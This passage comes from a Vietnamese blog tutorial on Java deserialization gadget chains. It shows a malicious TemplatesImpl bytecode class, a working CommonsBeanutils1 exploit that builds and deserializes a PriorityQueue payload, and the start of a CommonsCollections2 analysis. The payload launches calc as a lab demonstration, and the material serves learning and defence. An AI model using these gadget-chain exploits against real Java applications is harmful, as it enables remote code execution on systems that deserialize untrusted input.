</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> transformer;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Thuộc tính đã là <code>public</code>, ta có thể gọi trực tiếp.</p>
<p>Đầu tiên, để tạo chain, cần set 3 private properties là <code>_name</code>, <code>_tfactory</code> và <code>_bytecodes</code>:</p>
<ul>
<li>
<p><code>_name</code> chỉ cần khác <code>null</code> để gọi được đến <code>defineTransletClasses()</code>:
<img src="/images/2023/Java-deserialization-p1/_name.png" alt="_name"></p>
</li>
<li>
<p><code>_tfactory</code> cần là <code>TransformerFactoryImpl</code> object do trong <code>TemplatesImpl#defineTransletClasses()</code> có gọi đến method <code>TransformerFactoryImpl#getExternalExtensionsMap()</code>:
<img src="/images/2023/Java-deserialization-p1/_tfactory.png" alt="_tfactory"></p>
</li>
<li>
<p><code>_bytecodes</code> là bytecode để khởi tạo malicious class, class này còn phải là subclass của <code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>:
<img src="/images/2023/Java-deserialization-p1/_bytecodes.png" alt="_bytecodes"></p>
</li>
</ul>
<p>Ta tạo được malicious class sau:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> evil;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">EvilTemplatesImpl</span> <span style="color:#66d9ef">extends</span> AbstractTranslet {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// implements interface method thuộc interface Translet:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">transform</span>(DOM document, SerializationHandler<span style="color:#f92672">[]</span> handlers)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throws</span> TransletException {}
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// implements abstract method thuộc superclass AbstractTranslet:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">transform</span>(DOM document, DTMAxisIterator iterator,
</span></span><span style="display:flex;"><span>                          SerializationHandler handler) <span style="color:#66d9ef">throws</span> TransletException {}
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">EvilTemplatesImpl</span>() <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">super</span>();
</span></span><span style="display:flex;"><span>        Runtime.<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(<span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;calc&#34;</span>});
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Để ý có thể thấy có thêm 2 methods <code>transform()</code> trong malicious class trên, điều này là cần thiết do trong java, subclass cần implements các abstract methods trong superclass + vì superclass là abstract class nên nó có thể không implements tất cả các interface methods nên nếu subclass của nó không phải abstract thì phải implements các interface methods còn lại.</p>
<p><strong>PoC</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Main</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setFieldValue</span>(Object obj, String fieldName, Object value) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>        Field field <span style="color:#f92672">=</span> obj.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(fieldName);
</span></span><span style="display:flex;"><span>        field.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>        field.<span style="color:#a6e22e">set</span>(obj, value);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// java bytecode class EvilTemplatesImpl</span>
</span></span><span style="display:flex;"><span>        Path path <span style="color:#f92672">=</span> Paths.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;D:\\lab\\java\\CreateClass\\target\\classes\\evil\\EvilTemplatesImpl.class&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bArr <span style="color:#f92672">=</span> Files.<span style="color:#a6e22e">readAllBytes</span>(path);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        TemplatesImpl tplsImpl <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
</span></span><span style="display:flex;"><span>        setFieldValue(tplsImpl, <span style="color:#e6db74">&#34;_bytecodes&#34;</span>, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span>{bArr});
</span></span><span style="display:flex;"><span>        setFieldValue(tplsImpl, <span style="color:#e6db74">&#34;_name&#34;</span>, <span style="color:#e6db74">&#34;ahihi&#34;</span>);
</span></span><span style="display:flex;"><span>        setFieldValue(tplsImpl, <span style="color:#e6db74">&#34;_tfactory&#34;</span>, <span style="color:#66d9ef">new</span> TransformerFactoryImpl());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        tplsImpl.<span style="color:#a6e22e">newTransformer</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><img src="/images/2023/Java-deserialization-p1/popup1.png" alt="popup1"></p>
<h2 id="utilization-chain">Utilization chain</h2>
<p>Phần này sẽ phân tích một số chain sử dụng sink là <code>TemplatesImpl</code></p>
<h3 id="commonsbeanutils1">CommonsBeanutils1</h3>
<p>Đã test bản mới nhất: <code>1.9.3</code>
<strong>Full chain</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>PriorityQueue.<span style="color:#a6e22e">readObject</span>()
</span></span><span style="display:flex;"><span>    PriorityQueue.<span style="color:#a6e22e">heapify</span>()
</span></span><span style="display:flex;"><span>        PriorityQueue.<span style="color:#a6e22e">siftDown</span>()
</span></span><span style="display:flex;"><span>            PriorityQueue.<span style="color:#a6e22e">siftDownUsingComparator</span>()
</span></span><span style="display:flex;"><span>                BeanComparator.<span style="color:#a6e22e">compare</span>()
</span></span><span style="display:flex;"><span>                    PropertyUtils.<span style="color:#a6e22e">getProperty</span>
</span></span><span style="display:flex;"><span>                        TemplatesImpl.<span style="color:#a6e22e">getOutputProperties</span>()
</span></span><span style="display:flex;"><span>                            <span style="color:#f92672">|</span>TemplatesImpl.<span style="color:#a6e22e">newTransformer</span>()
</span></span><span style="display:flex;"><span>                            <span style="color:#f92672">|</span>TemplatesImpl.<span style="color:#a6e22e">getTransletInstance</span>()
</span></span><span style="display:flex;"><span>                            <span style="color:#f92672">|</span>TemplatesImpl.<span style="color:#a6e22e">defineTransletClasses</span>()
</span></span><span style="display:flex;"><span>                            <span style="color:#f92672">|</span>TransletClassLoader.<span style="color:#a6e22e">defineClass</span>()
</span></span></code></pre></div><p>Ta có <code>TemplatesImpl#getOutputProperties</code> cũng có thuộc tính <code>public</code> và gọi đến <code>newTransformer()</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">synchronized</span> Properties <span style="color:#a6e22e">getOutputProperties</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> newTransformer().<span style="color:#a6e22e">getOutputProperties</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">catch</span> (TransformerConfigurationException e) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Vậy nếu có chain invoke được getter method <code>getOutputProperties</code> =&gt; RCE</p>
<h4 id="propertyutilsgetproperty">PropertyUtils#getProperty</h4>
<p>Thư viện Apache Commons Beanutils cung cấp nhiều methods để làm việc với các <a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">JavaBeans</a> trong java, trong đó có static method <code>PropertyUtils.getProperty</code> cho phép người dùng gọi getter method của class JavaBeans bất kỳ, ví dụ:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>PropertyUtils.<span style="color:#a6e22e">getProperty</span>(<span style="color:#66d9ef">new</span> Person(), <span style="color:#e6db74">&#34;name&#34;</span>);
</span></span></code></pre></div><p>Thì commons-beanutils sẽ tự động tìm getter method từ name attribute -&gt; <code>getName</code> (đơn giản là viết hoa chữ cái đầu xong prefix thêm <code>get</code>) và invoke method đó để lấy giá trị trả về. Ngoài ra <code>PropertyUtils.getProperty</code> còn hỗ trợ đệ quy, vd object <code>a</code> chứa <code>b</code>, <code>b</code> chứa <code>c</code> ==&gt;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>PropertyUtils.<span style="color:#a6e22e">getProperty</span>(a, <span style="color:#e6db74">&#34;b.c&#34;</span>);
</span></span></code></pre></div><p>==&gt; Nhờ vào method này gọi được getter method của JavaBeans bất kỳ, chỗ nào sử dụng method này nhỉ?</p>
<h4 id="beancomparator-class">BeanComparator class</h4>
<p>Là một class trong commons-beanutils để so sánh liệu 2 JavaBeans có giống nhau, nó implements <code>java.util.Comparator</code> interface với method <code>compare()</code> gọi đến <code>PropertyUtils.getProperty</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">compare</span>(T o1, T o2) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">property</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">internalCompare</span>(o1, o2);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>            Object value1 <span style="color:#f92672">=</span> PropertyUtils.<span style="color:#a6e22e">getProperty</span>(o1, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">property</span>);
</span></span><span style="display:flex;"><span>            Object value2 <span style="color:#f92672">=</span> PropertyUtils.<span style="color:#a6e22e">getProperty</span>(o2, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">property</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">internalCompare</span>(value1, value2);
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (IllegalAccessException var5) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> RuntimeException(<span style="color:#e6db74">&#34;IllegalAccessException: &#34;</span> <span style="color:#f92672">+</span> var5.<span style="color:#a6e22e">toString</span>());
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (InvocationTargetException var6) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> RuntimeException(<span style="color:#e6db74">&#34;InvocationTargetException: &#34;</span> <span style="color:#f92672">+</span> var6.<span style="color:#a6e22e">toString</span>());
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (NoSuchMethodException var7) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> RuntimeException(<span style="color:#e6db74">&#34;NoSuchMethodException: &#34;</span> <span style="color:#f92672">+</span> var7.<span style="color:#a6e22e">toString</span>());
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Method này nhận 2 objects type generic là 2 tham số, nếu <code>this.property</code> là <code>null</code>
thì so sánh 2 object trực tiếp, nếu không sẽ gọi được <code>PropertyUtils.getProperty(o, this.property)</code> từ cả 2 object rồi so sánh giá trị lấy được.</p>
<p>Vậy điều còn lại cần làm là làm sao trigger được method <code>compare()</code> này.</p>
<h4 id="priorityqueuereadobject----beancomparatorcompare">PriorityQueue#readObject &ndash;&gt; BeanComparator#compare()</h4>
<p>Phần còn lại của chain, <code>java.util.PriorityQueue</code> là class đã có sẵn trong java runtime, có thể sử dụng để gọi từ <code>readObject()</code> -&gt; <code>Object#compare</code> khá straight forward.
Đầu tiên, từ method <code>readObject()</code> gọi sang <code>heapify()</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">heapify</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> (size <span style="color:#f92672">&gt;&gt;&gt;</span> 1) <span style="color:#f92672">-</span> 1; i <span style="color:#f92672">&gt;=</span> 0; i<span style="color:#f92672">--</span>)
</span></span><span style="display:flex;"><span>        siftDown(i, (E) queue<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>siftDown()</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">siftDown</span>(<span style="color:#66d9ef">int</span> k, E x) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (comparator <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>)
</span></span><span style="display:flex;"><span>        siftDownUsingComparator(k, x);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        siftDownComparable(k, x);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>nếu field <code>comparator</code> khác <code>null</code> sẽ sử dụng <code>siftDownUsingComparator()</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">siftDownUsingComparator</span>(<span style="color:#66d9ef">int</span> k, E x) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> half <span style="color:#f92672">=</span> size <span style="color:#f92672">&gt;&gt;&gt;</span> 1;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (k <span style="color:#f92672">&lt;</span> half) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> child <span style="color:#f92672">=</span> (k <span style="color:#f92672">&lt;&lt;</span> 1) <span style="color:#f92672">+</span> 1;
</span></span><span style="display:flex;"><span>        Object c <span style="color:#f92672">=</span> queue<span style="color:#f92672">[</span>child<span style="color:#f92672">]</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> right <span style="color:#f92672">=</span> child <span style="color:#f92672">+</span> 1;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (right <span style="color:#f92672">&lt;</span> size <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>            comparator.<span style="color:#a6e22e">compare</span>((E) c, (E) queue<span style="color:#f92672">[</span>right<span style="color:#f92672">]</span>) <span style="color:#f92672">&gt;</span> 0)
</span></span><span style="display:flex;"><span>            c <span style="color:#f92672">=</span> queue<span style="color:#f92672">[</span>child <span style="color:#f92672">=</span> right<span style="color:#f92672">]</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (comparator.<span style="color:#a6e22e">compare</span>(x, (E) c) <span style="color:#f92672">&lt;=</span> 0)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        queue<span style="color:#f92672">[</span>k<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> c;
</span></span><span style="display:flex;"><span>        k <span style="color:#f92672">=</span> child;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    queue<span style="color:#f92672">[</span>k<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> x;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Tại đây <code>comparator#compare()</code> sẽ được gọi để compare các object trong property <code>queue</code> với nhau.</p>
<p>Vậy là đã hoàn thành chain, tạo payload thôi</p>
<h4 id="poc">PoC</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> org.example;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.*;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javassist.ClassPool;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Base64;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.PriorityQueue;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.beanutils.BeanComparator;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Main</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">serTest</span>(Object obj) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>        ByteArrayOutputStream bArr <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream();
</span></span><span style="display:flex;"><span>        ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(bArr);
</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">writeObject</span>(obj);
</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">close</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bytes <span style="color:#f92672">=</span> bArr.<span style="color:#a6e22e">toByteArray</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> Base64.<span style="color:#a6e22e">getEncoder</span>().<span style="color:#a6e22e">encodeToString</span>(bytes);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">deserTest</span>(String input) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bArr <span style="color:#f92672">=</span> Base64.<span style="color:#a6e22e">getDecoder</span>().<span style="color:#a6e22e">decode</span>(input);
</span></span><span style="display:flex;"><span>        InputStream is <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span>  ByteArrayInputStream(bArr);
</span></span><span style="display:flex;"><span>        ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(is);
</span></span><span style="display:flex;"><span>        ois.<span style="color:#a6e22e">readObject</span>();
</span></span><span style="display:flex;"><span>        ois.<span style="color:#a6e22e">close</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setFieldValue</span>(Object obj, String fieldName, Object value) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>        Field field <span style="color:#f92672">=</span> obj.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(fieldName);
</span></span><span style="display:flex;"><span>        field.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>        field.<span style="color:#a6e22e">set</span>(obj, value);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bArr <span style="color:#f92672">=</span> ClassPool.<span style="color:#a6e22e">getDefault</span>().<span style="color:#a6e22e">get</span>(evil.<span style="color:#a6e22e">EvilTemplatesImpl</span>.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getName</span>()).<span style="color:#a6e22e">toBytecode</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        TemplatesImpl tplsImpl <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
</span></span><span style="display:flex;"><span>        setFieldValue(tplsImpl, <span style="color:#e6db74">&#34;_bytecodes&#34;</span>, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span>{bArr});
</span></span><span style="display:flex;"><span>        setFieldValue(tplsImpl, <span style="color:#e6db74">&#34;_name&#34;</span>, <span style="color:#e6db74">&#34;ahihi&#34;</span>);
</span></span><span style="display:flex;"><span>        setFieldValue(tplsImpl, <span style="color:#e6db74">&#34;_tfactory&#34;</span>, <span style="color:#66d9ef">new</span> TransformerFactoryImpl());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        BeanComparator beanComparator <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BeanComparator();
</span></span><span style="display:flex;"><span>        PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> priorityQueue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span>(beanComparator);
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// replace later</span>
</span></span><span style="display:flex;"><span>        priorityQueue.<span style="color:#a6e22e">add</span>(1);
</span></span><span style="display:flex;"><span>        priorityQueue.<span style="color:#a6e22e">add</span>(1); <span style="color:#75715e">// size = 2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        setFieldValue(beanComparator, <span style="color:#e6db74">&#34;property&#34;</span>, <span style="color:#e6db74">&#34;outputProperties&#34;</span>);
</span></span><span style="display:flex;"><span>        setFieldValue(priorityQueue, <span style="color:#e6db74">&#34;queue&#34;</span>, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{tplsImpl, tplsImpl});
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// test me</span>
</span></span><span style="display:flex;"><span>        String serialized <span style="color:#f92672">=</span> serTest(priorityQueue);
</span></span><span style="display:flex;"><span>        deserTest(serialized);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><strong>Note</strong>:</p>
<ol>
<li>Ta có thể dùng method <code>add()</code> để thêm object vào property <code>queue</code> class <code>PriorityQueue</code>, khi size <code>queue</code> &gt; 1, method <code>add()</code> sẽ tự gọi đến <code>compare()</code> ==&gt; tự RCE máy chính mình nên ở đây mình sẽ set trước 2 value harmless để khởi tạo sau đó mới sửa lại thành <code>TemplatesImpl</code> object thông qua reflection.</li>
<li>Ở đây mình dùng thêm thư viện <code>javassist</code> để tiện lấy bytecode từ class <code>EvilTemplatesImpl</code> mà không cần mò đi đọc file compiled class.</li>
</ol>
<p><img src="/images/2023/Java-deserialization-p1/popup2.png" alt="popup2"></p>
<h3 id="commonscollections2">CommonsCollections2</h3>
<p><strong>Yêu cầu</strong>: <code>commons-collections4==4.0</code> do từ version <code>4.1</code> Apache đã patch chain này. Ví dụ <code>org.apache.commons.collections4.functors.InvokerTransformer</code> không còn implements <code>Serializable</code> làm đứt chain:
<img src="/images/2023/Java-deserialization-p1/4.0.png" alt="4.0">
<em>4.0</em>
<img src="/images/2023/Java-deserialization-p1/4.1.png" alt="4.1">
<em>4.1</em></p>
<p><strong>Full chain</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>PriorityQueue.<span style="color:#a6e22e">readObject</span>()                            <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>    PriorityQueue.<span style="color:#a6e22e">heapify</span>()                           <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>        PriorityQueue.<span style="color:#a6e22e">siftDown</span>()                      <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>            PriorityQueue.<span style="color:#a6e22e">siftDownUsingComparator</span>() __<span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>                TransformingComparator.<span style="color:#a6e22e">compare</span>()
</span></span><span style="display:flex;"><span>                    InvokerTransformer.<span style="color:#a6e22e">transform</span>()
</span></span><span style="display:flex;"><span>                        Method.<span style="color:#a6e22e">invoke</span>()
</span></span><span style="display:flex;"><span>                          <span style="color:#f92672">--|</span>TemplatesImpl.<span style="color:#a6e22e">newTransformer</span>()
</span></span><span style="display:flex;"><span>                            <span style="color:#f92672">|</span>TemplatesImpl.<span style="color:#a6e22e">getTransletInstance</span>()
</span></span><span style="display:flex;"><span>                            <span style="color:#f92672">|</span>TemplatesImpl.<span style="color:#a6e22e">defineTransletClasses</span>()
</span></span><span style="display:flex;"><span>                            <span style="color:#f92672">|</span>TransletClassLoader.<span style="color:#a6e22e">defineClass</span>()
</span></span></code></pre></div><p>So với CommonsBeanutils1, chain CC2 chỉ khác ở phần cuối source từ <code>TransformingComparator#compare()</code>.</p>
<h4 id="transformingcomparatorcompare--invokertransformertransform">TransformingComparator#compare() &amp;&amp; InvokerTransformer#transform()</h4>
<p>Method <code>TransformingComparator#compare()</code> sẽ gọi đến <code>InvokerTransformer#transform()</code> với arguments lần lượt là 2 object đang muốn so sánh:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">compare</span>(I obj1, I obj2) {
</span></span><span style="display:flex;"><span>    O value1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">transformer</span>.<span style="color:#a6e22e">transform</span>(obj1);
</span></span><span style="display:flex;"><span>    O value2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">transformer</span>.<span style="color:#a6e22e">transform</span>(obj2);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">decorated</span>.<span style="color:#a6e22e">compare</span>(value1, value2);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>InvokerTransformer#transform()</code> sẽ invoke method bất kỳ từ object <code>input</code> với các fields <code>iMethodName</code>, <code>iParamTypes</code>, <code>iArgs</code> dễ dàng set qua constructor của nó:</p>
